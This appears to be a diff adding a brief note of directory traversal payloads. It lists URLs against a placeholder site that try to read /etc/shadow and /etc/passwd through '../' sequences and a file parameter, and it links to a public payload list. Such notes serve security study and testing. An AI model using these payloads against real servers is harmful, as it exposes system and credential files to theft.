@@ -1,0 +1,5 @@
+ http://some_site.com.br/get-files?file=../../../../some dir/some file 
+http://some_site.com.br/../../../../etc/shadow  
+http://some_site.com.br/get-files?file=/etc/passwd 
+
+resorces: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/Intruder/directory_traversal.txt
